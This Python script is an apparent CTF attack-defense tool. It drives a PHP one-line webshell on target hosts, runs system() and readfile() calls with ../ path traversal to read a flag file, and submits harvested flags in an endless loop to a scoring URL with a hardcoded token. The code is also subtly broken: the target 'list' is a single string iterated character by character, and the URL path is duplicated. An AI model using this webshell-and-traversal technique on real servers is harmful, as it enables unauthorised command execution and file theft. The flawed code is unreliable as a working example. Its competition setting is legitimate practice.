# -*- coding: utf-8 -*-
# 作者    : 轩昂妄想
# 文件    : Link_the_Trojan.py
# 时间    : 2022/10/6 15:39
# -----------------------------------------------------------------------------------
import requests
import re

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"}
data = {
    'a': "system('cat+/home/ctf/flag');"  # 一句话木马
}

# 读取IP
# file = open('ip_result_of_scanning.txt', "r")
# ip_list = file.read().splitlines()
# file.close()
ip_list = "http://192.168.56.135/awd/"
list =[]
def shell():
    for i in ip_list:
        try:
            #url = i + "awd/index.php?a=system(\'readfile()\');"
            url = i+"awd/index.php?a=print_r(readfile(%27../../../../../home/ctf/flag%27))"
            response = requests.post(url, headers=headers, timeout=1)
            print(response)
            code = response.status_code
            # print(i+"e/search/result/1.php?s=print_r(readfile(%27../../../../home/ctf/flag%27))")
            # list.append(io.text[0:38])
            print(code)
            list.append(re.search("flag{.*}", response.text).group(0)[:38])
        except requests.exceptions.RequestException as e:
            pass



def shell1():
    for i in ip_list:
        try:
            url = i+"e/search/result/1.php?s=print_r(readfile(%27../../../../home/ctf/flag%27))"
            response = requests.get(url, headers=headers, timeout=1)
            list.append(re.search("flag{.*}", response.text).group(0)[:38])
        except requests.exceptions.RequestException as e:
            pass
    print(list)

while True:
    shell()
    #shell1()

    for i in list:
        io = requests.get("https://ctf.bugku.com/awd/submit.html?token=c2c1e4d002daa9eea931888935b0dd86&flag=" + str(i))  # token 根据场景更改